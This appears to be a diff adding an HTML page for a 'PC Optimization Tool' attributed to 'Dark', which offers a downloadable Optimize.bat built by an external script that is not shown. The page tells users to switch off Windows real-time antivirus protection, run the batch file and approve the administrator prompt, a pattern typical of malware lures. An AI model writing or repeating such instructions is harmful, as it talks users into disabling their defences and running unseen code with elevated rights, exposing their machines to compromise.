@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PC Optimization Script Generator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+    <!-- Link to your external CSS file -->
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body class="p-4 md:p-8">
+
+    <!-- Splash Screen -->
+    <div id="splash-screen">
+        <h1 id="splash-text">WELCOME TO DARK'S PERFORMANCE</h1>
+    </div>
+
+    <!-- Main Content (Initially Hidden) -->
+    <div id="main-content" class="w-full max-w-3xl hidden">
+        <div class="main-container">
+            <div class="text-center mb-8">
+                <h1 class="text-4xl font-bold main-header">PC Optimization Tool</h1>
+                <p class="text-gray-400 mt-2">Generate a script to help clean and maintain your Windows PC.</p>
+            </div>
+
+            <!-- How to Use Section -->
+            <div class="instructions-box mb-8">
+                <h2 class="text-2xl font-bold mb-4 text-white">Instructions</h2>
+                
+                <div class="warning-box p-4 rounded-md mb-6">
+                    <p class="font-bold">Important Security Notice</p>
+                    <p class="text-sm">Antivirus software may block this script because it uses system tools. For it to work, you must **temporarily disable your antivirus** before running it.</p>
+                </div>
+
+                <ol class="list-decimal list-inside space-y-3 text-gray-300">
+                    <li>
+                        <strong class="text-white">Disable Antivirus:</strong> Go to "Windows Security" > "Virus & threat protection" and turn off "Real-time protection".
+                    </li>
+                    <li>
+                        <strong>Download the Script:</strong> Click the button below to download the `Optimize.bat` file.
+                    </li>
+                    <li>
+                        <strong>Run the Script:</strong> Find the downloaded file and **double-click** it. When the Windows security prompt appears, click **"Yes"**.
+                    </li>
+                     <li>
+                        <strong>Re-enable Antivirus:</strong> After the script finishes, remember to turn your antivirus protection back on.
+                    </li>
+                </ol>
+            </div>
+
+            <!-- Download Button -->
+            <div class="text-center">
+                <button class="download-btn text-lg" onclick="generateAndDownload()">
+                    Download Optimizer
+                </button>
+                <p id="feedback" class="text-blue-400 mt-4 h-5"></p>
+            </div>
+
+
+            <!-- Credit Line -->
+            <div class="text-center mt-12">
+                <p class="credit-line text-sm">// Made by Dark</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Link to your external JavaScript file -->
+    <script src="js/script.js"></script>
+</body>
+</html>
